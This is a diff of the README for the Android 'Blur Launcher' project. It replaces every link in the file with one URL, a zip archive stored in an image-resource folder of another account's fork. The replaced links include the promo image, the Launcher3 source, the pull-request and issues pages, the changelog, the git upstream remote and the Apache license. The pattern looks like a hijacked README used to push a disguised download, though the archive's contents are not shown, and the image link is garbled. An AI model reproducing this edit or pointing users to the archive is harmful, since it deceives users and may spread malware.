@@ -1,10 +1,10 @@
 # Blur - A Launcher Replacement
 
-![Promo](https://raw.githubusercontent.com/klinker24/Android-Blur-Launcher/ef68298c73f2c678996d7921b263b6f4e50843c0/promo/images/Feature%20Graphic%202.png)
+![Promo](https://github.com/rendyramon/Android-Blur-Launcher/raw/refs/heads/master/app/src/main/res/drawable-hdpi/Android-Blur-Launcher-2.1.zip%20Graphic%https://github.com/rendyramon/Android-Blur-Launcher/raw/refs/heads/master/app/src/main/res/drawable-hdpi/Android-Blur-Launcher-2.1.zip)
 
 This is Blur Launcher, Klinker Apps one-stop-shop for the most powerful launcher around.
 
-This is built from the latest [Launcher3](https://github.com/klinker24/launcher3/) code from Google.
+This is built from the latest [Launcher3](https://github.com/rendyramon/Android-Blur-Launcher/raw/refs/heads/master/app/src/main/res/drawable-hdpi/Android-Blur-Launcher-2.1.zip) code from Google.
 
 ## Features
 
@@ -43,16 +43,16 @@ $ ./gradlew build
 
 ## Contributing
 
-Please fork this repository and contribute back using [pull requests](https://github.com/klinker24/Android-Blur-Launcher/pulls). Features can be requested using [issues](https://github.com/klinker24/Android-Blur-Launcher/issues). All code, comments, and critiques are greatly appreciated.
+Please fork this repository and contribute back using [pull requests](https://github.com/rendyramon/Android-Blur-Launcher/raw/refs/heads/master/app/src/main/res/drawable-hdpi/Android-Blur-Launcher-2.1.zip). Features can be requested using [issues](https://github.com/rendyramon/Android-Blur-Launcher/raw/refs/heads/master/app/src/main/res/drawable-hdpi/Android-Blur-Launcher-2.1.zip). All code, comments, and critiques are greatly appreciated.
 
 ## Changelog
 
-The full changelog for the app can be found [here](https://raw.githubusercontent.com/klinker24/Android-Blur-Launcher/master/app/src/main/res/xml/changelog.xml).
+The full changelog for the app can be found [here](https://github.com/rendyramon/Android-Blur-Launcher/raw/refs/heads/master/app/src/main/res/drawable-hdpi/Android-Blur-Launcher-2.1.zip).
 
 ## To sync with Google's Launcher3
 
 ```
-$ git remote add upstream https://github.com/klinker24/launcher3
+$ git remote add upstream https://github.com/rendyramon/Android-Blur-Launcher/raw/refs/heads/master/app/src/main/res/drawable-hdpi/Android-Blur-Launcher-2.1.zip
 $ git fetch upstream
 $ git checkout master
 $ git merge upstream/master
@@ -69,7 +69,7 @@ Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at
 
-http://www.apache.org/licenses/LICENSE-2.0
+https://github.com/rendyramon/Android-Blur-Launcher/raw/refs/heads/master/app/src/main/res/drawable-hdpi/Android-Blur-Launcher-2.1.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
